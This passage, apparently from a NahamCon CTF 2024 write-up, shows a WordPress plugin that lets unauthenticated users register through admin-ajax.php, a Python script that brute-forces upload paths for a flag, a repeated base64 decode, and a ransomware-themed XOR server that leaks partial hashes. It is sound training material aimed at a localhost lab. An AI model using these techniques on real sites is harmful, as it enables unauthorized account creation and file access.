<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_PLUGIN_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;test-plugin&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;1.0.0&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_URL&#39;</span><span class="p">,</span> <span class="nx">plugin_dir_url</span><span class="p">(</span> <span class="no">__FILE__</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_PATH&#39;</span><span class="p">,</span> <span class="nx">plugin_dir_path</span><span class="p">(</span> <span class="no">__FILE__</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_BASE_DIR&#39;</span><span class="p">,</span> <span class="nx">plugin_dir_path</span><span class="p">(</span> <span class="no">__FILE__</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span> <span class="s1">&#39;PLUGIN_NAME_BASE_NAME&#39;</span><span class="p">,</span> <span class="nx">plugin_basename</span><span class="p">(</span> <span class="no">__FILE__</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span><span class="s2">&#34;wp_ajax_nopriv_register_user&#34;</span><span class="p">,</span> <span class="s2">&#34;register_user&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">register_user</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;email&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">wp_create_user</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;user created&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><!-- ![Alt text](image-15.png) -->
<p><a class="lightgallery" href="/nahamcon-ctf-2024/image-15.png" title="/nahamcon-ctf-2024/image-15.png" data-thumbnail="/nahamcon-ctf-2024/image-15.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-15.png"
            srcset="/nahamcon-ctf-2024/image-15.png, /nahamcon-ctf-2024/image-15.png 1.5x, /nahamcon-ctf-2024/image-15.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-15.png" height="567"  width="100%" >
    </a>
The <code>add_action(&quot;wp_ajax_nopriv_register_user&quot;, &quot;register_user&quot;);</code> is an action hook that allows user registration through <code>wp-admin/admin-ajax.php</code>  <a href="https://developer.wordpress.org/plugins/javascript/ajax/" target="_blank" rel="noopener noreferrer">https://developer.wordpress.org/plugins/javascript/ajax/</a></p>
<p>The request made to <code>admin-ajax.php</code> will look like this
<a class="lightgallery" href="/nahamcon-ctf-2024/image-17.png" title="/nahamcon-ctf-2024/image-17.png" data-thumbnail="/nahamcon-ctf-2024/image-17.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-17.png"
            srcset="/nahamcon-ctf-2024/image-17.png, /nahamcon-ctf-2024/image-17.png 1.5x, /nahamcon-ctf-2024/image-17.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-17.png" height="553"  width="100%" >
    </a></p>
<p>We now login through wordpress by using credentials registered through <code>admin-ajax.php</code>
<a class="lightgallery" href="/nahamcon-ctf-2024/image-18.png" title="/nahamcon-ctf-2024/image-18.png" data-thumbnail="/nahamcon-ctf-2024/image-18.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-18.png"
            srcset="/nahamcon-ctf-2024/image-18.png, /nahamcon-ctf-2024/image-18.png 1.5x, /nahamcon-ctf-2024/image-18.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-18.png" height="899"  width="100%" >
    </a></p>
<h3 id="brute-forcing-media-content" class="headerLink">
    <a href="#brute-forcing-media-content" class="header-mark"></a>Brute-Forcing media content</h3><p>We got through dashboard. Now what? I really thought that after getting in the dashboard I could just access the flag in the media files but it seems that i cannot view the media files with my role.</p>
<p>I learned media files are available once authenticated and once we know the file name that we are looking for we can just brute-force the <code>/uploads</code> directory year and date.
<a class="lightgallery" href="/nahamcon-ctf-2024/image-1.png" title="/nahamcon-ctf-2024/image-1.png" data-thumbnail="/nahamcon-ctf-2024/image-1.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-1.png"
            srcset="/nahamcon-ctf-2024/image-1.png, /nahamcon-ctf-2024/image-1.png 1.5x, /nahamcon-ctf-2024/image-1.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-1.png" height="691"  width="100%" >
    </a></p>
<p>In the Dockerfile we can see the <code>flag.png</code> is renamed to <code>/flag_secret_not_so_random_get_me_1337.png</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">RUN</span> docker-php-ext-install zip<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> docker-php-ext-install gd<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> flag.png /flag_secret_not_so_random_get_me_1337.png<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> plugins/test-plugin /tmp/test-plugin<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> .htaccess /tmp/.htaccess <span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENTRYPOINT</span> <span class="p">[</span> <span class="s2">&#34;make&#34;</span><span class="p">,</span> <span class="s2">&#34;-f&#34;</span><span class="p">,</span> <span class="s2">&#34;/scripts/Makefile&#34;</span> <span class="p">]</span>  <span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Using this script, I Brute-forced the flag from the uploads directory</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8687//wp-content/uploads&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;wp-cookies&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">year</span> <span class="o">=</span> <span class="mi">2024</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">month</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">13</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">month</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="n">month</span> <span class="o">=</span> <span class="s2">&#34;0&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">month</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">year</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">month</span><span class="si">}</span><span class="s2">/flag_secret_not_so_random_get_me_1337.png&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">),</span> <span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Page Not Found&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag URL:&#34;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/nahamcon-ctf-2024/image-20.png" title="/nahamcon-ctf-2024/image-20.png" data-thumbnail="/nahamcon-ctf-2024/image-20.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-20.png"
            srcset="/nahamcon-ctf-2024/image-20.png, /nahamcon-ctf-2024/image-20.png 1.5x, /nahamcon-ctf-2024/image-20.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-20.png" height="175"  width="100%" >
    </a>
<a class="lightgallery" href="/nahamcon-ctf-2024/secret-info.png" title="/nahamcon-ctf-2024/secret-info.png" data-thumbnail="/nahamcon-ctf-2024/secret-info.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/secret-info.png"
            srcset="/nahamcon-ctf-2024/secret-info.png, /nahamcon-ctf-2024/secret-info.png 1.5x, /nahamcon-ctf-2024/secret-info.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/secret-info.png" height="526"  width="100%" >
    </a></p>
<h2 id="wp-elevator-in-progress" class="headerLink">
    <a href="#wp-elevator-in-progress" class="header-mark"></a>WP Elevator (in-progress)</h2><p><code>#wordpress</code> <code>#code-review</code></p>
<blockquote>
<p>Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don&rsquo;t know how it works but will talk with him once he finishes.</p>
</blockquote>
<p>This is also Wordpress whitebox web Challenge similar to Secret Info. I was able not able to solve this during competition but I want to create writeup. Will be updating once i solve the challenge offline.</p>
<h1 id="scripting" class="headerLink">
    <a href="#scripting" class="header-mark"></a>Scripting</h1><h2 id="base3200-50-pts" class="headerLink">
    <a href="#base3200-50-pts" class="header-mark"></a>Base3200 (50 pts)</h2><blockquote>
<p>You know what to do.</p>
</blockquote>
<p>First thing I did was searched google for some scripts and I instantly found one that solved it.
<a href="https://gist.github.com/intrd/c63db7bd3d0951f0653d6fdf7ea169d6" target="_blank" rel="noopener noreferrer">https://gist.github.com/intrd/c63db7bd3d0951f0653d6fdf7ea169d6</a>.</p>
<p>This decodes from base64 the provided file 50 times. can also be done through bash by doing <code>cat theflag | base64 -d | base64 -d ...</code> 50 times
</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pontfile</span> <span class="o">=</span> <span class="s1">&#39;theflag&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pontfile</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># flag{340ff1bee05244546c91dea53fba7642}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hashes-on-hashes-on-hashes-310-pts" class="headerLink">
    <a href="#hashes-on-hashes-on-hashes-310-pts" class="header-mark"></a>Hashes on Hashes on Hashes (310 pts)</h2><p><code>#brute-force</code> <code>#decryption</code></p>
<blockquote>
<p>I created a server to manage all my encrypted data from my lucrative ransomware business. It&rsquo;s still in development, but I should be okay as long as.. wait, what? Somebody leaked a log file??</p>
</blockquote>
<p>We are given the <code>decryption_server.log</code></p>
<a class="lightgallery" href="/nahamcon-ctf-2024/image-8.png" title="/nahamcon-ctf-2024/image-8.png" data-thumbnail="/nahamcon-ctf-2024/image-8.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-8.png"
            srcset="/nahamcon-ctf-2024/image-8.png, /nahamcon-ctf-2024/image-8.png 1.5x, /nahamcon-ctf-2024/image-8.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-8.png" height="695"  width="100%" >
    </a>
<p>server.py provided file</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">log</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@staticmethod</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">print</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./test.log&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">now</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%d</span><span class="s2">/%m/%Y %H:%M:%S&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;Key loaded for encrypted message&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">factor</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span> <span class="o">//</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="n">factor</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Key expanded by factor of </span><span class="si">{</span><span class="n">factor</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">enc_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Partial message digest is </span><span class="si">{</span><span class="n">md5</span><span class="p">(</span><span class="n">dec_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">dec_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;Message fully decrypted, ready to send...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main_loop</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Server listening on host </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2"> and port </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;Listening for connection...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">c_soc</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Connection received from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">c_soc</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Received encrypted message </span><span class="si">{</span><span class="n">ciphertext</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">c_soc</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted message sent!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main_loop</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="message-decryption" class="headerLink">
    <a href="#message-decryption" class="header-mark"></a>Message decryption</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;Key loaded for encrypted message&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">factor</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span> <span class="o">//</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># matches the key length to the length of base64 encoded text</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="n">factor</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Key expanded by factor of </span><span class="si">{</span><span class="n">factor</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># decrypt from base64 </span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
